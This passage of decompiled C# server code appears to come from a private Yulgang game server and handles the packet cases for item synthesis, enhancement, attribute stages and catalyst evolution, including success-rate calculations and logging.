							if (装备栏包裹[num30].FLD_强化数量 < 5 && value66.FLD_JOB_LEVEL == 3 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5))
							{
								flag6 = true;
							}
							break;
						case 1008002231:
						case 1008002247:
						case 1008002263:
							if (装备栏包裹[num30].FLD_强化数量 < 5 && value66.FLD_JOB_LEVEL == 4 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5))
							{
								flag6 = true;
							}
							break;
						case 1008002232:
						case 1008002248:
						case 1008002264:
							if (装备栏包裹[num30].FLD_强化数量 < 5 && value66.FLD_JOB_LEVEL == 5 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5))
							{
								flag6 = true;
							}
							break;
						case 1008002233:
						case 1008002249:
						case 1008002265:
							if (装备栏包裹[num30].FLD_强化数量 < 5 && value66.FLD_JOB_LEVEL == 6 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5))
							{
								flag6 = true;
							}
							break;
						case 1008002234:
						case 1008002250:
						case 1008002266:
							if (装备栏包裹[num30].FLD_强化数量 < 5 && value66.FLD_JOB_LEVEL == 7 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5))
							{
								flag6 = true;
							}
							break;
						case 1008002235:
						case 1008002251:
						case 1008002267:
							if (装备栏包裹[num30].FLD_强化数量 < 5 && value66.FLD_JOB_LEVEL == 8 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5))
							{
								flag6 = true;
							}
							break;
						case 1008002236:
						case 1008002252:
						case 1008002268:
							if (装备栏包裹[num30].FLD_强化数量 < 5 && value66.FLD_JOB_LEVEL == 9 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5))
							{
								flag6 = true;
							}
							break;
						case 1008002237:
						case 1008002253:
						case 1008002269:
							if (装备栏包裹[num30].FLD_强化数量 < 5 && value66.FLD_JOB_LEVEL == 10 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5))
							{
								flag6 = true;
							}
							break;
						}
						if (!flag6)
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
							break;
						}
						int 钱数3 = (合成手续费 = 计算合成强化费用(value66, num30, num));
						HcItimesClass hcItimesClass27 = new HcItimesClass();
						hcItimesClass27.位置 = num30;
						hcItimesClass27.物品 = 装备栏包裹[num30].物品_byte;
						HcItimesClass value67 = hcItimesClass27;
						装备栏包裹[num30].锁定 = true;
						合成物品表.TryAdd(1, value67);
						合成提示(num, 1, 钱数3, 装备栏包裹[num30]);
					}
					catch (Exception ex6)
					{
						base.Client.Dispose();
						MainForm.WriteLine(9, "合成水晶符放装备出错![" + base.Userid + "]-[" + base.UserName + "]" + ex6.Message);
					}
					break;
				case 42:
					try
					{
						if (base.当前操作类型 != 101 || (合成物品表.ContainsKey(4) ? true : false))
						{
							break;
						}
						HcItimesClass hcItimesClass77;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass77 = 合成物品表[1];
							if (合成物品表.Count == 0)
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
								break;
							}
							ItmeClass value94 = new ItmeClass();
							if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 1 || ((!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass77.物品id, 0), out value94)) ? true : false))
							{
								break;
							}
							if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 800000006 && ((BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 800000060) ? true : false))
							{
								合成提示(num, 7, 0, 装备栏包裹[num30]);
							}
							else if (value94.FLD_LEVEL >= 130)
							{
								if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) == 800000060)
								{
									goto IL_9c5c;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else
							{
								if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) == 800000006)
								{
									goto IL_9c5c;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							break;
						}
						合成提示(num, 5, 0, 装备栏包裹[num30]);
						goto end_IL_9a44;
						IL_9c5c:
						HcItimesClass hcItimesClass26 = new HcItimesClass();
						hcItimesClass26.位置 = num30;
						hcItimesClass26.物品 = 装备栏包裹[num30].物品_byte;
						HcItimesClass value95 = hcItimesClass26;
						装备栏包裹[num30].锁定 = true;
						if (!合成物品表.ContainsKey(2))
						{
							合成物品表.TryAdd(2, value95);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
						hcItimesClass77.得到属性();
						if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) >= 2 && hcItimesClass77.属性1.属性数量 + hcItimesClass77.属性2.属性数量 != 0)
						{
							if (!合成物品表.ContainsKey(3))
							{
								合成物品表.TryAdd(3, value95);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
							if (hcItimesClass77.属性1.属性数量 + hcItimesClass77.属性2.属性数量 != 0 && hcItimesClass77.属性3.属性数量 + hcItimesClass77.属性4.属性数量 != 0 && BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) >= 3 && !合成物品表.ContainsKey(4))
							{
								合成物品表.TryAdd(4, value95);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
						}
						end_IL_9a44:;
					}
					catch (Exception ex22)
					{
						base.Client.Dispose();
						MainForm.WriteLine(9, "合成水晶符放强化出错[" + base.Userid + "]-[" + base.UserName + "]" + ex22.Message);
					}
					break;
				case 43:
					try
					{
						if (base.当前操作类型 == 101)
						{
							if (合成物品表.Count == 0)
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (!合成物品表.ContainsKey(5))
							{
								HcItimesClass hcItimesClass25 = new HcItimesClass();
								hcItimesClass25.位置 = num30;
								hcItimesClass25.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value135 = hcItimesClass25;
								装备栏包裹[num30].锁定 = true;
								合成物品表.TryAdd(5, value135);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
						}
					}
					catch (Exception ex52)
					{
						base.Client.Dispose();
						MainForm.WriteLine(9, "合成水晶符放幸运符出错![" + base.Userid + "]-[" + base.UserName + "]" + ex52.Message);
					}
					break;
				case 49:
					try
					{
						if (合成物品表.TryGetValue(1, out var value142))
						{
							装备栏包裹[value142.位置].锁定 = false;
							合成提示(num, 1, 0, 装备栏包裹[value142.位置]);
						}
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						打开仓库中 = false;
					}
					catch (Exception ex60)
					{
						元宝合成开关 = 0;
						base.Client.Dispose();
						MainForm.WriteLine(9, "合成水晶符取消出错![" + base.Userid + "]-[" + base.UserName + "]" + ex60.Message);
					}
					break;
				case 50:
				{
					if (base.当前操作类型 != 102)
					{
						break;
					}
					byte[] array7 = new byte[4];
					byte[] dst2 = new byte[4];
					Buffer.BlockCopy(封包数据, 14, array7, 0, 4);
					Buffer.BlockCopy(封包数据, 18, dst2, 0, 4);
					if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array7, 0)].物品ID, 0) == 0 || ((合成物品表.Count <= 0) ? true : false))
					{
						break;
					}
					HcItimesClass hcItimesClass114 = null;
					if (合成物品表.ContainsKey(1))
					{
						hcItimesClass114 = 合成物品表[1];
					}
					if (BitConverter.ToInt64(装备栏包裹[hcItimesClass114.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass114.物品全局ID, 0))
					{
						break;
					}
					if (装备栏包裹[hcItimesClass114.位置].物品绑定)
					{
						合成提示(num, 2, 0, 装备栏包裹[hcItimesClass114.位置]);
						break;
					}
					hcItimesClass114.得到属性();
					if (hcItimesClass114.属性4.属性类型 != 0)
					{
						hcItimesClass114.属性4.属性类型 = 0;
						hcItimesClass114.属性4.属性数量 = 0;
						hcItimesClass114.设置属性();
					}
					else if (hcItimesClass114.属性3.属性类型 != 0)
					{
						hcItimesClass114.属性3.属性类型 = 0;
						hcItimesClass114.属性3.属性数量 = 0;
						hcItimesClass114.设置属性();
					}
					else if (hcItimesClass114.属性2.属性类型 != 0)
					{
						hcItimesClass114.属性2.属性类型 = 0;
						hcItimesClass114.属性2.属性数量 = 0;
						hcItimesClass114.设置属性();
					}
					else if (hcItimesClass114.属性1.属性类型 != 0)
					{
						hcItimesClass114.属性1.属性类型 = 0;
						hcItimesClass114.属性1.属性数量 = 0;
						hcItimesClass114.设置属性();
					}
					减去物品(BitConverter.ToInt32(array7, 0), 1);
					if (BitConverter.ToInt32(装备栏包裹[hcItimesClass114.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass114.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass114.物品全局ID, 0)) ? true : false))
					{
						减去物品(hcItimesClass114.位置, 1);
						增加物品(hcItimesClass114.物品全局ID, hcItimesClass114.物品id, hcItimesClass114.位置, hcItimesClass114.物品数量, hcItimesClass114.物品属性);
					}
					装备栏包裹[hcItimesClass114.位置].锁定 = false;
					合成提示(num, 1, 0, 装备栏包裹[hcItimesClass114.位置]);
					合成物品表.Clear();
					合成系统解锁();
					元宝合成开关 = 0;
					打开仓库中 = false;
					RxjhClass.合成记录(base.Userid, base.UserName, 装备栏包裹[hcItimesClass114.位置].得到物品名称(), num, "八卦回天符", "成功", 装备栏包裹[hcItimesClass114.位置]);
					break;
				}
				case 51:
					try
					{
						if (base.当前操作类型 == 102 && !合成物品表.ContainsKey(1) && !装备栏包裹[num30].物品绑定 && 装备栏包裹[num30].物品属性强 <= 0)
						{
							HcItimesClass hcItimesClass24 = new HcItimesClass();
							hcItimesClass24.位置 = num30;
							hcItimesClass24.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value184 = hcItimesClass24;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value184);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex94)
					{
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex94.Message);
					}
					break;
				case 59:
					try
					{
						if (合成物品表.TryGetValue(1, out var value136))
						{
							装备栏包裹[value136.位置].锁定 = false;
							合成提示(num, 1, 0, 装备栏包裹[value136.位置]);
						}
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						打开仓库中 = false;
					}
					catch (Exception ex53)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 八卦回天符 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex53.Message);
					}
					break;
				case 60:
					try
					{
						if (base.当前操作类型 != 19 || 合成物品表 == null || ((合成物品表.Count <= 0) ? true : false))
						{
							break;
						}
						HcItimesClass hcItimesClass174 = null;
						HcItimesClass hcItimesClass70 = null;
						HcItimesClass hcItimesClass71 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass174 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass70 = 合成物品表[2];
						}
						if (合成物品表.ContainsKey(3))
						{
							hcItimesClass71 = 合成物品表[3];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass174.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass174.物品全局ID, 0))
						{
							合成提示(61, 5, 0, 装备栏包裹[hcItimesClass174.位置]);
							合成物品表.Clear();
						}
						else if (BitConverter.ToInt64(装备栏包裹[hcItimesClass70.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass70.物品全局ID, 0))
						{
							合成提示(61, 5, 0, 装备栏包裹[hcItimesClass70.位置]);
							合成物品表.Clear();
						}
						else if (hcItimesClass71 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass71.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass71.物品全局ID, 0)) ? true : false))
						{
							合成提示(61, 5, 0, 装备栏包裹[hcItimesClass71.位置]);
							合成物品表.Clear();
						}
						else
						{
							if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass174.物品id, 0), out var value80))
							{
								break;
							}
							if (value80.FLD_RESIDE2 != 1 && ((value80.FLD_RESIDE2 != 4) ? true : false))
							{
								合成提示(61, 5, 0, 装备栏包裹[hcItimesClass174.位置]);
								合成物品表.Clear();
								break;
							}
							if (装备栏包裹[hcItimesClass174.位置].物品绑定)
							{
								合成提示(num, 3, 0, 装备栏包裹[hcItimesClass174.位置]);
								合成物品表.Clear();
								break;
							}
							hcItimesClass174.强化属性阶段();
							hcItimesClass70.强化属性阶段();
							double num11 = RNG.Next(1, 100);
							double num12 = 100.0;
							if (hcItimesClass174.阶段数量 >= 10)
							{
								合成提示(61, 3, 0, 装备栏包裹[hcItimesClass174.位置]);
								合成物品表.Clear();
								break;
							}
							if (hcItimesClass71 != null)
							{
								num11 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass71.物品id, 0));
							}
							if (元宝合成开关 == 1)
							{
								num11 += 5.0;
							}
							if (base.FLD_VIP == 1)
							{
								num11 += 100.0 * World.VIP合成率增加百分比;
							}
							if (World.赋予属性率 != 0.0)
							{
								num11 += 100.0 * World.赋予属性率;
							}
							if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
							{
								num11 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
							}
							if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
							{
								num11 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
							}
							switch (hcItimesClass174.阶段数量)
							{
							case 0:
								num12 -= World.赋予属性一阶段;
								break;
							case 1:
								num12 -= World.赋予属性二阶段;
								break;
							case 2:
								num12 -= World.赋予属性三阶段;
								break;
							case 3:
								num12 -= World.赋予属性四阶段;
								break;
							case 4:
								num12 -= World.赋予属性五阶段;
								break;
							case 5:
								num12 -= World.赋予属性六阶段;
								break;
							case 6:
								num12 -= World.赋予属性七阶段;
								break;
							case 7:
								num12 -= World.赋予属性八阶段;
								break;
							case 8:
								num12 -= World.赋予属性九阶段;
								break;
							case 9:
								num12 -= World.赋予属性十阶段;
								break;
							}
							if (num11 >= num12)
							{
								if (hcItimesClass174.阶段数量 == 0 || ((hcItimesClass70.阶段类型 == hcItimesClass174.阶段类型) ? true : false))
								{
									hcItimesClass174.阶段类型 = hcItimesClass70.阶段类型;
									hcItimesClass174.阶段数量++;
									hcItimesClass174.设置阶段属性();
									合成提示(num, 1, 0, 装备栏包裹[hcItimesClass174.位置]);
									RxjhClass.合成记录(base.Userid, base.UserName, value80.ItmeNAME, num, "上属性", "成功", 装备栏包裹[hcItimesClass174.位置]);
								}
								else
								{
									hcItimesClass174.阶段数量 = 0;
									hcItimesClass174.设置阶段属性();
									合成提示(num, 0, 0, 装备栏包裹[hcItimesClass174.位置]);
									RxjhClass.合成记录(base.Userid, base.UserName, value80.ItmeNAME, num, "上属性", "失败", 装备栏包裹[hcItimesClass174.位置]);
								}
							}
							else
							{
								hcItimesClass174.阶段数量 = 0;
								hcItimesClass174.设置阶段属性();
								合成提示(num, 0, 0, 装备栏包裹[hcItimesClass174.位置]);
							}
							减去物品(hcItimesClass70.位置, 1);
							if (hcItimesClass71 != null)
							{
								减去物品(hcItimesClass71.位置, 1);
							}
							if (BitConverter.ToInt32(装备栏包裹[hcItimesClass174.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass174.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass174.物品全局ID, 0)) ? true : false))
							{
								减去物品(hcItimesClass174.位置, 1);
								增加物品(hcItimesClass174.物品全局ID, hcItimesClass174.物品id, hcItimesClass174.位置, hcItimesClass174.物品数量, hcItimesClass174.物品属性);
							}
							装备栏包裹[hcItimesClass174.位置].锁定 = false;
							合成物品表.Clear();
							合成系统解锁();
							元宝合成开关 = 0;
							break;
						}
					}
					catch (Exception ex16)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex16.Message);
					}
					break;
				case 61:
					try
					{
						if (base.当前操作类型 == 19)
						{
							if (合成物品表.ContainsKey(1))
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
								break;
							}
							if (装备栏包裹[num30].物品绑定 || ((装备栏包裹[num30].FLD_属性数量 >= 10) ? true : false))
							{
								合成提示(num, 3, 0, 装备栏包裹[num30]);
								break;
							}
							if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out var value88) && value88.FLD_RESIDE2 != 1 && ((value88.FLD_RESIDE2 != 4) ? true : false))
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
								break;
							}
							HcItimesClass hcItimesClass23 = new HcItimesClass();
							hcItimesClass23.位置 = num30;
							hcItimesClass23.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value89 = hcItimesClass23;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value89);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex19)
					{
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex19.Message);
					}
					break;
				case 62:
					try
					{
						if (base.当前操作类型 == 19 && 合成物品表.Count != 0 && !合成物品表.ContainsKey(2))
						{
							HcItimesClass hcItimesClass22 = new HcItimesClass();
							hcItimesClass22.位置 = num30;
							hcItimesClass22.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value148 = hcItimesClass22;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(2, value148);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex66)
					{
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex66.Message);
					}
					break;
				case 63:
					try
					{
						if (base.当前操作类型 == 19 && 合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
						{
							HcItimesClass hcItimesClass21 = new HcItimesClass();
							hcItimesClass21.位置 = num30;
							hcItimesClass21.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value69 = hcItimesClass21;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(3, value69);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex7)
					{
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex7.Message);
					}
					break;
				case 69:
					try
					{
						if (合成物品表.TryGetValue(1, out var value178))
						{
							装备栏包裹[value178.位置].锁定 = false;
							合成提示(num, 1, 0, 装备栏包裹[value178.位置]);
						}
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
					}
					catch (Exception ex85)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex85.Message);
					}
					break;
				case 70:
				{
					if (base.当前操作类型 != 103)
					{
						break;
					}
					byte[] array28 = new byte[4];
					byte[] dst3 = new byte[4];
					Buffer.BlockCopy(封包数据, 14, array28, 0, 4);
					Buffer.BlockCopy(封包数据, 18, dst3, 0, 4);
					if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array28, 0)].物品ID, 0) == 0 || ((合成物品表.Count <= 0) ? true : false))
					{
						break;
					}
					HcItimesClass hcItimesClass172 = null;
					if (合成物品表.ContainsKey(1))
					{
						hcItimesClass172 = 合成物品表[1];
					}
					if (BitConverter.ToInt64(装备栏包裹[hcItimesClass172.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass172.物品全局ID, 0))
					{
						break;
					}
					if (装备栏包裹[hcItimesClass172.位置].物品绑定)
					{
						合成提示(num, 2, 0, 装备栏包裹[hcItimesClass172.位置]);
						break;
					}
					hcItimesClass172.强化属性阶段();
					hcItimesClass172.阶段类型 = 0;
					hcItimesClass172.阶段数量 = 0;
					hcItimesClass172.设置阶段属性();
					减去物品(BitConverter.ToInt32(array28, 0), 1);
					if (BitConverter.ToInt32(装备栏包裹[hcItimesClass172.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass172.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass172.物品全局ID, 0)) ? true : false))
					{
						减去物品(hcItimesClass172.位置, 1);
						增加物品(hcItimesClass172.物品全局ID, hcItimesClass172.物品id, hcItimesClass172.位置, hcItimesClass172.物品数量, hcItimesClass172.物品属性);
					}
					装备栏包裹[hcItimesClass172.位置].锁定 = false;
					合成物品表.Clear();
					合成系统解锁();
					元宝合成开关 = 0;
					合成提示(num, 1, 0, 装备栏包裹[hcItimesClass172.位置]);
					break;
				}
				case 71:
					try
					{
						if (base.当前操作类型 == 103 && !合成物品表.ContainsKey(1) && !装备栏包裹[num30].物品绑定 && 装备栏包裹[num30].FLD_属性类型 != 0 && !装备栏包裹[num30].物品绑定 && (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out var value41) || value41.FLD_RESIDE2 == 1 || value41.FLD_RESIDE2 == 4))
						{
							HcItimesClass hcItimesClass20 = new HcItimesClass();
							hcItimesClass20.位置 = num30;
							hcItimesClass20.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value42 = hcItimesClass20;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value42);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex116)
					{
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex116.Message);
					}
					break;
				case 79:
					try
					{
						if (合成物品表.TryGetValue(1, out var value70))
						{
							装备栏包裹[value70.位置].锁定 = false;
							合成提示(num, 1, 0, 装备栏包裹[value70.位置]);
						}
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						打开仓库中 = false;
					}
					catch (Exception ex8)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 八卦回天符 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex8.Message);
					}
					break;
				case 80:
					try
					{
						if (合成物品表.Count <= 0)
						{
							return;
						}
						HcItimesClass hcItimesClass165 = null;
						HcItimesClass hcItimesClass166 = null;
						HcItimesClass hcItimesClass167 = null;
						HcItimesClass hcItimesClass168 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass165 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass166 = 合成物品表[2];
						}
						if (合成物品表.ContainsKey(3))
						{
							hcItimesClass167 = 合成物品表[3];
						}
						if (合成物品表.ContainsKey(4))
						{
							hcItimesClass168 = 合成物品表[4];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass165.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass165.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass166.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass166.物品全局ID, 0))
						{
							return;
						}
						if (hcItimesClass167 == null)
						{
							合成提示(num, 7, 0, 装备栏包裹[num30]);
							return;
						}
						if (hcItimesClass168 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass168.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass168.物品全局ID, 0))
						{
							return;
						}
						if (装备栏包裹[hcItimesClass165.位置].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass165.位置]);
							return;
						}
						if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass165.物品id, 0), out var value73))
						{
							return;
						}
						if (value73.FLD_RESIDE2 != 1 && value73.FLD_RESIDE2 != 2 && value73.FLD_RESIDE2 != 4 && value73.FLD_RESIDE2 != 5 && value73.FLD_RESIDE2 != 6)
						{
							MainForm.WriteLine(6, "合成系统 WGF BUG11[" + BitConverter.ToInt32(hcItimesClass165.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass166.物品id, 0) + "]");
							return;
						}
						Random random8 = new Random(World.GetRandomSeed());
						double num5 = random8.Next(1, 100);
						double num6 = random8.Next(1, 100);
						if (hcItimesClass168 != null)
						{
							num5 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass168.物品id, 0));
						}
						if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
						{
							num5 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
						}
						if (公有药品.ContainsKey(1008000312))
						{
							num5 += 10.0;
						}
						if (元宝合成开关 == 1)
						{
							num5 += 5.0;
						}
						if (base.FLD_VIP == 1)
						{
							num5 += 100.0 * World.VIP合成率增加百分比;
						}
						if (num5 >= num6)
						{
							hcItimesClass165.FLD_FJ_进化 = hcItimesClass166.FLD_FJ_进化;
							if (base.FLD_VIP == 1)
							{
								系统提示("恭喜您，VIP用户提高合成率" + World.VIP合成率增加百分比 * 100.0 + "%", 9, "[组合成功]");
							}
						}
						else
						{
							系统提示("VIP用户提高合成率" + World.VIP合成率增加百分比 * 100.0 + "%", 9, "[组合失败]");
						}
						Buffer.BlockCopy(array12, 0, array, 11, 2);
						Buffer.BlockCopy(hcItimesClass165.物品, 0, array, 31, 4);
						Buffer.BlockCopy(hcItimesClass165.物品, 0, array, 39, 20);
						Buffer.BlockCopy(BitConverter.GetBytes(num30), 0, array, 27, 4);
						Buffer.BlockCopy(装备栏包裹[num30].物品ID, 0, array, 31, 4);
						Buffer.BlockCopy(装备栏包裹[num30].物品属性, 0, array, 39, World.物品属性大小);
						Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 95, 4);
						Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 103, 4);
						减去物品(hcItimesClass166.位置, 1);
						if (hcItimesClass166.FLD_FJ_进化 == 1 || hcItimesClass166.FLD_FJ_进化 == 2)
						{
							减去物品(hcItimesClass167.位置, 1);
						}
						if (hcItimesClass168 != null)
						{
							减去物品(hcItimesClass168.位置, 1);
						}
						if (BitConverter.ToInt32(装备栏包裹[hcItimesClass165.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass165.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass165.物品全局ID, 0))
						{
							减去物品(hcItimesClass165.位置, 1);
							增加物品(hcItimesClass165.物品全局ID, hcItimesClass165.物品id, hcItimesClass165.位置, hcItimesClass165.物品数量, hcItimesClass165.物品属性);
						}
						装备栏包裹[hcItimesClass165.位置].锁定 = false;
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						合成提示(num, 1, 0, 装备栏包裹[hcItimesClass165.位置]);
					}
					catch (Exception ex10)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "触媒确认出错![" + base.Userid + "]-[" + base.UserName + "]" + ex10.Message);
					}
					break;
				case 81:
					try
					{
						if (!装备栏包裹[num30].锁定 && !合成物品表.ContainsKey(1))
						{
							HcItimesClass hcItimesClass18 = new HcItimesClass();
							hcItimesClass18.位置 = num30;
							hcItimesClass18.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value38 = hcItimesClass18;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value38);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex113)
					{
						MainForm.WriteLine(1, "触媒材料1[" + base.Userid + "]-[" + base.UserName + "]" + ex113.Message);
					}
					break;
				case 82:
					try
					{
						HcItimesClass hcItimesClass158 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass158 = 合成物品表[1];
						}
						if (装备栏包裹[num30].FLD_FJ_进化 <= hcItimesClass158.FLD_FJ_进化)
						{
							合成提示(num, 6, 0, 装备栏包裹[num30]);
							return;
						}
						if (合成物品表.Count == 0)
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						else if (!合成物品表.ContainsKey(2) && !装备栏包裹[num30].锁定 && !装备栏包裹[num30].物品绑定)
						{
							HcItimesClass hcItimesClass17 = new HcItimesClass();
							hcItimesClass17.位置 = num30;
							hcItimesClass17.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value54 = hcItimesClass17;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(2, value54);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex4)
					{
						MainForm.WriteLine(1, "触媒材料2[" + base.Userid + "]-[" + base.UserName + "]" + ex4.Message);
					}
					break;
				case 83:
					try
					{
						HcItimesClass hcItimesClass147 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass147 = 合成物品表[1];
						}
						if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass147.物品id, 0), out var value36))
						{
							return;
						}
						if (value36.FLD_RESIDE2 == 4)
						{
							if (装备栏包裹[num30].Get物品ID != 1000000926)
							{
								合成提示(num, 8, 0, 装备栏包裹[num30]);
								return;
							}
						}
